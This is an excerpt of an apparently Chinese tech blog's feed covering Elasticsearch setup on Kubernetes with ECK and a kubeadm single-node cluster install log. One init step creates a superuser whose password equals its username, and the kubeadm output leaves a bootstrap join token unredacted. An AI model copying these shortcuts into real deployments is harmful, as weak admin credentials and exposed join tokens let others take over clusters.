&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">donviewclass-initialize&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">command&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">sh&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- -&lt;span class="l">c&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> ./bin/elasticsearch-plugin install -batch https://ghproxy.com/https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.9.1/elasticsearch-analysis-ik-7.9.1.zip
&lt;/span>&lt;span class="sd"> ./bin/elasticsearch-users useradd tsdonviewclass -p tsdonviewclass -r superuser&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>./bin/elasticsearch-users useradd tsdonviewclass -p tsdonviewclass -r superuser&lt;/code> 主要就是增加这一句。同样是因为懒，权限直接给了 superuser 。&lt;/p>
&lt;p>参考文档：&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/users-command.html" target="_blank" rel="noopener"
>elasticsearch-users&lt;/a> 。&lt;/p>
&lt;h2 id="0x04-配置pvc">0x04 配置PVC&lt;/h2>
&lt;p>依然是参考官方文档来：&lt;a class="link" href="https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-volume-claim-templates.html" target="_blank" rel="noopener"
>k8s-volume-claim-templates&lt;/a>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">nodeSets&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">default&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">count&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">config&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">node.store.allow_mmap&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumeClaimTemplates&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">elasticsearch-data&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Do not change this name unless you set up a volume mount for the data path.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">accessModes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">ReadWriteOnce&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">resources&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">requests&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storage&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">5Gi&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">storageClassName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">local-path&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意 &lt;code>volumeClaimTemplates&lt;/code> 下 &lt;code>metadata.name&lt;/code> 不要变，除非你自己在 &lt;code>podTemplate&lt;/code> 里覆写挂载字段。&lt;/p>
&lt;p>其他的 &lt;code>spec&lt;/code> 下内容和通常的 PVC 一样，可以参考 &lt;a class="link" href="https://kubernetes.io/zh/docs/concepts/storage/persistent-volumes/#persistentvolumeclaims" target="_blank" rel="noopener"
>Kubernetes - PersistentVolumeClaims&lt;/a> 。&lt;/p>
&lt;p>值得注意的是 ECK 默认在集群节点数量 scaled down 时删除 PVC ，对应的 PV 可能保留，具体看&lt;a class="link" href="https://kubernetes.io/docs/concepts/storage/storage-classes/#reclaim-policy" target="_blank" rel="noopener"
>存储类的回收策略&lt;/a>。ECK 的 CRD 里也给了相关的配置项。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">elasticsearch.k8s.elastic.co/v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Elasticsearch&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">es&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">7.15.2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumeClaimDeletePolicy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">DeleteOnScaledownOnly&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">nodeSets&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">default&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">count&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">3&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意 &lt;code>volumeClaimDeletePolicy: DeleteOnScaledownOnly&lt;/code> 。可选的策略包括：&lt;/p>
&lt;ul>
&lt;li>&lt;code>DeleteOnScaledownAndClusterDeletion&lt;/code>&lt;/li>
&lt;li>&lt;code>DeleteOnScaledownOnly&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>默认策略是 &lt;code>DeleteOnScaledownAndClusterDeletion&lt;/code> ，集群删除和 scaled down 时删除 PVC。&lt;/p>
&lt;p>如果是一次性的部署，可以直接用 &lt;code>emptyDir&lt;/code> 作为存储类，不用管数据丢不丢。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这几步配置下来，一个开发用的 ES 集群就算是配完了，资源给够就能开始玩了。&lt;/p>
&lt;p>讲道理我不太会运维 ES 啊，ES 这东西实在有点重量级，现阶段的能力也就只能看文档这里那里配一下，在上面开发什么的。真要遇到大问题还得抓瞎。&lt;/p>
&lt;p>就先这样吧。&lt;/p></description></item><item><title>kubeadm安装实验集群记录</title><link>https://nnnewb.github.io/blog/p/kubernetes-manually-install-by-kubeadm/</link><pubDate>Thu, 25 Nov 2021 14:31:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/kubernetes-manually-install-by-kubeadm/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>好吧，如果仔细想想就会发现不管是 k3s 还是 ucloud 上的 k8s ，都没有一个是自己手动配置好的。虽说并不是至关重要的，但手动用 kubeadm 装一次 kubernetes 总不会有什么坏处。顺手做个笔记。参考资料列出如下。&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/" target="_blank" rel="noopener"
>https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://mirrors.tuna.tsinghua.edu.cn/help/kubernetes/" target="_blank" rel="noopener"
>https://mirrors.tuna.tsinghua.edu.cn/help/kubernetes/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://computingforgeeks.com/deploy-kubernetes-cluster-on-ubuntu-with-kubeadm/" target="_blank" rel="noopener"
>https://computingforgeeks.com/deploy-kubernetes-cluster-on-ubuntu-with-kubeadm/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="系统配置">系统配置&lt;/h2>
&lt;p>正式安装之前先确认一些系统级配置。&lt;/p>
&lt;h3 id="swapoff">swapoff&lt;/h3>
&lt;p>简单的做法是 &lt;code>sudo swapoff -a&lt;/code> 即可。之后改 &lt;code>fstab&lt;/code> 把 &lt;code>swap&lt;/code> 分区关掉。&lt;/p>
&lt;h3 id="iptables检查桥接流量">iptables检查桥接流量&lt;/h3>
&lt;p>用 &lt;code>lsmod | grep bf_netfitler&lt;/code> 检查有没有启用 &lt;code>bf_netfilter&lt;/code> 模块，如果没有输出的话说明没加载，执行下面的命令。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">cat &lt;span class="s">&amp;lt;&amp;lt;EOF | sudo tee /etc/modules-load.d/k8s.conf
&lt;/span>&lt;span class="s">br_netfilter
&lt;/span>&lt;span class="s">EOF&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>会在 &lt;code>/etc/modules-load.d&lt;/code> 下添加一个模块自动加载的配置。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">cat &lt;span class="s">&amp;lt;&amp;lt;EOF | sudo tee /etc/sysctl.d/k8s.conf
&lt;/span>&lt;span class="s">net.bridge.bridge-nf-call-ip6tables = 1
&lt;/span>&lt;span class="s">net.bridge.bridge-nf-call-iptables = 1
&lt;/span>&lt;span class="s">EOF&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再在 &lt;code>/etc/sysctl.d/&lt;/code> 下添加一个配置，允许 &lt;code>iptables&lt;/code> 查看桥接流量。&lt;/p>
&lt;p>然后用 &lt;code>sysctl&lt;/code> 重载配置。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo sysctl --system
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="端口">端口&lt;/h3>
&lt;p>控制平面节点的端口清单，如果有本机防火墙的话需要开放下面的端口。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>协议&lt;/th>
&lt;th>方向&lt;/th>
&lt;th>端口范围&lt;/th>
&lt;th>作用&lt;/th>
&lt;th>使用者&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>6443&lt;/td>
&lt;td>Kubernetes API 服务器&lt;/td>
&lt;td>所有组件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>2379-2380&lt;/td>
&lt;td>etcd 服务器客户端 API&lt;/td>
&lt;td>kube-apiserver, etcd&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>10250&lt;/td>
&lt;td>Kubelet API&lt;/td>
&lt;td>kubelet 自身、控制平面组件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>10251&lt;/td>
&lt;td>kube-scheduler&lt;/td>
&lt;td>kube-scheduler 自身&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>10252&lt;/td>
&lt;td>kube-controller-manager&lt;/td>
&lt;td>kube-controller-manager 自身&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>工作节点的端口清单，如果有本机防火墙的话需要开放下面的端口。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>协议&lt;/th>
&lt;th>方向&lt;/th>
&lt;th>端口范围&lt;/th>
&lt;th>作用&lt;/th>
&lt;th>使用者&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>10250&lt;/td>
&lt;td>Kubelet API&lt;/td>
&lt;td>kubelet 自身、控制平面组件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TCP&lt;/td>
&lt;td>入站&lt;/td>
&lt;td>30000-32767&lt;/td>
&lt;td>NodePort 服务†&lt;/td>
&lt;td>所有组件&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="容器运行时">容器运行时&lt;/h3>
&lt;p>参考 &lt;a class="link" href="https://mirrors.tuna.tsinghua.edu.cn/help/docker-ce/" target="_blank" rel="noopener"
>清华大学开源软件镜像站 Docker Community Edition 镜像使用帮助&lt;/a>。&lt;/p>
&lt;h3 id="安装kubeadm">安装kubeadm&lt;/h3>
&lt;p>先信任软件仓库的证书，要注意的是证书托管在谷歌，所以基本不用考虑直接执行命令能成功了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg &lt;span class="p">|&lt;/span> sudo apt-key add -
&lt;/code>&lt;/pre>&lt;/div>&lt;p>作为代替，可以先手动魔法上网下载到证书，再变通一下完成证书添加。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">cat apt-key.gpg &lt;span class="p">|&lt;/span> sudo apt-key add -
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后添加源，源的版本并不能直接对应到发行版的版本，目前 ubuntu server 只支持到 16.04 LTS ，或者 Debian 9 Stretch 。更高版本也可以装，但我比较怀疑官方的包到底有没有在新发行版里测试过，支持力度行不行。&lt;/p>
&lt;p>总之，如果宿主机不拿来当开发环境使的话，上个 Ubuntu server 16.04 LTS 也没事，只要还没有完全停止支持就好。总之这个问题上我保留意见吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;deb https://mirrors.tuna.tsinghua.edu.cn/kubernetes/apt kubernetes-xenial main&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> sudo tee /etc/apt/sources.list.d/kubernetes.list
&lt;/code>&lt;/pre>&lt;/div>&lt;p>添加软件源之后更新软件包清单并安装 &lt;code>kubelet&lt;/code>、&lt;code>kubeadm&lt;/code>、&lt;code>kubectl&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo apt update
sudo apt install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="检查">检查&lt;/h3>
&lt;p>首先确认所有 &lt;code>kubelet&lt;/code>、&lt;code>kubeadm&lt;/code>、&lt;code>kubectl&lt;/code> 命令都已经可用，如果命令不存在则说明安装有问题，根据具体情况处理。&lt;/p>
&lt;p>然后检查&lt;code>kubelet&lt;/code>服务的状态（注意用了&lt;code>systemd&lt;/code>，不确定有没有用 &lt;code>upstart&lt;/code> 或别的 Unix 风格的服务管理的）。&lt;/p>
&lt;p>运行命令 &lt;code>sudo systemctl status kubelet&lt;/code> 得到下面的输出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">● kubelet.service - kubelet: The Kubernetes Node Agent
Loaded: loaded (/lib/systemd/system/kubelet.service; enabled; vendor preset: enabled)
Drop-In: /etc/systemd/system/kubelet.service.d
└─10-kubeadm.conf
Active: activating (auto-restart) (Result: exit-code) since Fri 2021-11-19 02:32:29 UTC; 9s ago
Docs: https://kubernetes.io/docs/home/
Process: 6767 ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS (code=exited, status=1/FAILURE)
Main PID: 6767 (code=exited, status=1/FAILURE)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时的 &lt;code>kubelet&lt;/code> 服务还是失败的状态，再检查 &lt;code>kubelet&lt;/code> 的日志，通过 &lt;code>sudo journalctl -u kubelet&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">-- Logs begin at Thu 2021-11-18 07:40:58 UTC, end at Fri 2021-11-19 02:34:19 UTC. --
Nov 19 02:27:41 vm systemd[1]: Started kubelet: The Kubernetes Node Agent.
Nov 19 02:27:42 vm systemd[1]: kubelet.service: Current command vanished from the unit file, execution of the command list won&amp;#39;t be resumed.
Nov 19 02:27:42 vm systemd[1]: Stopping kubelet: The Kubernetes Node Agent...
Nov 19 02:27:42 vm systemd[1]: kubelet.service: Succeeded.
Nov 19 02:27:42 vm systemd[1]: Stopped kubelet: The Kubernetes Node Agent.
Nov 19 02:27:42 vm systemd[1]: Started kubelet: The Kubernetes Node Agent.
Nov 19 02:27:42 vm kubelet[5944]: E1119 02:27:42.559949 5944 server.go:206] &amp;#34;Failed to load kubelet config file&amp;#34; err=&amp;#34;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube&amp;gt;
Nov 19 02:27:42 vm systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE
Nov 19 02:27:42 vm systemd[1]: kubelet.service: Failed with result &amp;#39;exit-code&amp;#39;.
Nov 19 02:27:52 vm systemd[1]: kubelet.service: Scheduled restart job, restart counter is at 1.
Nov 19 02:27:52 vm systemd[1]: Stopped kubelet: The Kubernetes Node Agent.
Nov 19 02:27:52 vm systemd[1]: Started kubelet: The Kubernetes Node Agent.
Nov 19 02:27:52 vm kubelet[6119]: E1119 02:27:52.804723 6119 server.go:206] &amp;#34;Failed to load kubelet config file&amp;#34; err=&amp;#34;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube&amp;gt;
Nov 19 02:27:52 vm systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE
Nov 19 02:27:52 vm systemd[1]: kubelet.service: Failed with result &amp;#39;exit-code&amp;#39;.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>失败的原因是 &lt;code>Failed to load kubelet config file&amp;quot; err=&amp;quot;failed to load Kubelet config file /var/lib/kubelet/config.yaml, error failed to read kube&amp;gt;&lt;/code>。&lt;/p>
&lt;h2 id="创建集群">创建集群&lt;/h2>
&lt;p>目标是创建一个单节点的集群。&lt;/p>
&lt;h3 id="拉取镜像">拉取镜像&lt;/h3>
&lt;p>众所周知的原因，&lt;code>kubernetes&lt;/code> 的镜像托管在谷歌服务器上，麻瓜是访问不到的，所以就连拉取镜像也值得用几十个字来说。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo kubeadm config images pull --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="初始化主节点">初始化主节点&lt;/h3>
&lt;p>注意使用 &lt;code>kubeadm config images pull&lt;/code> 拉取了镜像的话，在 &lt;code>init&lt;/code> 阶段除非你把镜像 tag 给改了，不然也要传个 &lt;code>--image-repository&lt;/code> 参数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo kubeadm init --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[init] Using Kubernetes version: v1.22.4
[preflight] Running pre-flight checks
[preflight] Pulling images required for setting up a Kubernetes cluster
[preflight] This might take a minute or two, depending on the speed of your internet connection
[preflight] You can also perform this action in beforehand using &amp;#39;kubeadm config images pull&amp;#39;
[certs] Using certificateDir folder &amp;#34;/etc/kubernetes/pki&amp;#34;
[certs] Generating &amp;#34;ca&amp;#34; certificate and key
[certs] Generating &amp;#34;apiserver&amp;#34; certificate and key
[certs] apiserver serving cert is signed for DNS names [kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local vm] and IPs [10.96.0.1 10.0.2.15]
[certs] Generating &amp;#34;apiserver-kubelet-client&amp;#34; certificate and key
[certs] Generating &amp;#34;front-proxy-ca&amp;#34; certificate and key
[certs] Generating &amp;#34;front-proxy-client&amp;#34; certificate and key
[certs] Generating &amp;#34;etcd/ca&amp;#34; certificate and key
[certs] Generating &amp;#34;etcd/server&amp;#34; certificate and key
[certs] etcd/server serving cert is signed for DNS names [localhost vm] and IPs [10.0.2.15 127.0.0.1 ::1]
[certs] Generating &amp;#34;etcd/peer&amp;#34; certificate and key
[certs] etcd/peer serving cert is signed for DNS names [localhost vm] and IPs [10.0.2.15 127.0.0.1 ::1]
[certs] Generating &amp;#34;etcd/healthcheck-client&amp;#34; certificate and key
[certs] Generating &amp;#34;apiserver-etcd-client&amp;#34; certificate and key
[certs] Generating &amp;#34;sa&amp;#34; key and public key
[kubeconfig] Using kubeconfig folder &amp;#34;/etc/kubernetes&amp;#34;
[kubeconfig] Writing &amp;#34;admin.conf&amp;#34; kubeconfig file
[kubeconfig] Writing &amp;#34;kubelet.conf&amp;#34; kubeconfig file
[kubeconfig] Writing &amp;#34;controller-manager.conf&amp;#34; kubeconfig file
[kubeconfig] Writing &amp;#34;scheduler.conf&amp;#34; kubeconfig file
[kubelet-start] Writing kubelet environment file with flags to file &amp;#34;/var/lib/kubelet/kubeadm-flags.env&amp;#34;
[kubelet-start] Writing kubelet configuration to file &amp;#34;/var/lib/kubelet/config.yaml&amp;#34;
[kubelet-start] Starting the kubelet
[control-plane] Using manifest folder &amp;#34;/etc/kubernetes/manifests&amp;#34;
[control-plane] Creating static Pod manifest for &amp;#34;kube-apiserver&amp;#34;
[control-plane] Creating static Pod manifest for &amp;#34;kube-controller-manager&amp;#34;
[control-plane] Creating static Pod manifest for &amp;#34;kube-scheduler&amp;#34;
[etcd] Creating static Pod manifest for local etcd in &amp;#34;/etc/kubernetes/manifests&amp;#34;
[wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory &amp;#34;/etc/kubernetes/manifests&amp;#34;. This can take up to 4m0s
sudo kubeadm init --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers[apiclient] All control plane components are healthy after 9.003038 seconds
[upload-config] Storing the configuration used in ConfigMap &amp;#34;kubeadm-config&amp;#34; in the &amp;#34;kube-system&amp;#34; Namespace
[kubelet] Creating a ConfigMap &amp;#34;kubelet-config-1.22&amp;#34; in namespace kube-system with the configuration for the kubelets in the cluster
[upload-certs] Skipping phase. Please see --upload-certs
[mark-control-plane] Marking the node vm as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers]
[mark-control-plane] Marking the node vm as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule]
[bootstrap-token] Using token: jfhacg.2ahc3yqndiwct9vk
[bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles
[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes
[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials
[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token
[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster
[bootstrap-token] Creating the &amp;#34;cluster-info&amp;#34; ConfigMap in the &amp;#34;kube-public&amp;#34; namespace
[kubelet-finalize] Updating &amp;#34;/etc/kubernetes/kubelet.conf&amp;#34; to point to a rotatable kubelet client certificate and key
[addons] Applied essential addon: CoreDNS
[addons] Applied essential addon: kube-proxy
Your Kubernetes control-plane has initialized successfully!
To start using your cluster, you need to run the following as a regular user:
mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
Alternatively, if you are the root user, you can run:
export KUBECONFIG=/etc/kubernetes/admin.conf
You should now deploy a pod network to the cluster.
Run &amp;#34;kubectl apply -f [podnetwork].yaml&amp;#34; with one of the options listed at:
https://kubernetes.io/docs/concepts/cluster-administration/addons/
Then you can join any number of worker nodes by running the following on each as root:
kubeadm join 10.0.2.15:6443 --token jfhacg.2ahc3yqndiwct9vk \
--discovery-token-ca-cert-hash sha256:377d6ead2bde8373000333d883c9bd9449233686fe277814ccade0b55fc362a1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为是虚拟机里的集群，也没打算给任何人访问，关键信息懒得打码了。&lt;/p>
&lt;p>几个值得关注的内容：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="c1"># Your Kubernetes control-plane has initialized successfully!&lt;/span>
&lt;span class="c1"># To start using your cluster, you need to run the following as a regular user:&lt;/span>
mkdir -p &lt;span class="nv">$HOME&lt;/span>/.kube
sudo cp -i /etc/kubernetes/admin.conf &lt;span class="nv">$HOME&lt;/span>/.kube/config
sudo chown &lt;span class="k">$(&lt;/span>id -u&lt;span class="k">)&lt;/span>:&lt;span class="k">$(&lt;/span>id -g&lt;span class="k">)&lt;/span> &lt;span class="nv">$HOME&lt;/span>/.kube/config
&lt;span class="c1"># Alternatively, if you are the root user, you can run:&lt;/span>
&lt;span class="nb">export&lt;/span> &lt;span class="nv">KUBECONFIG&lt;/span>&lt;span class="o">=&lt;/span>/etc/kubernetes/admin.conf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>首先，集群控制平面已经初始化成功了，说明命令执行基本 OK，没有致命错误。&lt;/p>
&lt;p>后面就是教你怎么配置 &lt;code>kubectl&lt;/code> 来访问控制平面，集群的管理员配置放在 &lt;code>/etc/kubernetes/admin.conf&lt;/code> ，可以用 &lt;code>KUBECONFIG&lt;/code> 环境变量来使用，或者把配置文件复制到家目录下的路径 &lt;code>~/.kube/config&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">You should now deploy a pod network to the cluster.
Run &amp;#34;kubectl apply -f [podnetwork].yaml&amp;#34; with one of the options listed at:
https://kubernetes.io/docs/concepts/cluster-administration/addons/
&lt;/code>&lt;/pre>&lt;/div>&lt;p>提示你应该部署一个 POD 网络到集群，也就是一般说的 CNI 插件，以便 POD 之间可以互相通信。安装插件之前，集群的 DNS （&lt;code>CoreDNS&lt;/code>） 不会启动。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">Then you can join any number of worker nodes by running the following on each as root:
kubeadm join 10.0.2.15:6443 --token jfhacg.2ahc3yqndiwct9vk \
--discovery-token-ca-cert-hash sha256:377d6ead2bde8373000333d883c9bd9449233686fe277814ccade0b55fc362a1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一旦搞定了网络插件，就可以用 &lt;code>kubeadm&lt;/code> 继续添加新的节点到集群里了。&lt;/p>
&lt;h3 id="安装网络插件">安装网络插件&lt;/h3>
&lt;p>看起来大家都在用 &lt;code>calico&lt;/code> 做 POD 网络，所以我也用 &lt;code>calico&lt;/code> 好了。步骤参考 &lt;code>calico&lt;/code> 的&lt;a class="link" href="https://docs.projectcalico.org/getting-started/kubernetes/self-managed-onprem/onpremises" target="_blank" rel="noopener"
>官方文档&lt;/a> 和 &lt;a class="link" href="https://docs.projectcalico.org/getting-started/kubernetes/quickstart" target="_blank" rel="noopener"
>官方的快速开始&lt;/a> 来配置一个单节点集群的 POD 。&lt;/p>
&lt;p>正式开始前，参考上面的内容配置好 &lt;code>kubectl&lt;/code> ，以便无需 root 权限运行 &lt;code>kubectl&lt;/code> 命令。&lt;/p>
